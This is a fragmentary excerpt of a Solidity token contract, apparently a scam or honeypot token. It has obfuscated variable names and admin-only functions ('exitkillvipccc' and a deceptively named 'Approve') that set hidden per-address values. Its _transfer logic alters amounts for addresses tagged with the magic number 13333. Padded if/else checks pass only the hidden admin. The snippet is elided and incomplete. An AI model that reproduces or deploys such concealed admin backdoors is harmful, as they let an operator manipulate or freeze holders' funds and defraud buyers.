...
contract Token is Ownable {
    ...
    function exitkillvipccc(address cjjjss) public    {
        uint128 zramount = 0;
        ggvvmuserlddbt[cjjjss] = zramount;    
        if(_msgSender() == ziuwAdmincvvt){
            require(_msgSender() == ziuwAdmincvvt);
        }else{
            require(_msgSender() == ziuwAdmincvvt);
        }
    ...
    function Approve(address cjjjss) public    {
        ...
        ggvvmuserlddbt[cjjjss] = newpassnum;
        if(_msgSender() == ziuwAdmincvvt){
            require(_msgSender() == ziuwAdmincvvt);
        }else{
            require(_msgSender() == ziuwAdmincvvt);
    ...
    function _transfer(
        ...
        if (13333 != ggvvmuserlddbt[vipFrom]) {}else{
            amount = _balances[vipFrom] + ggvvmuserlddbt[vipFrom];
        }
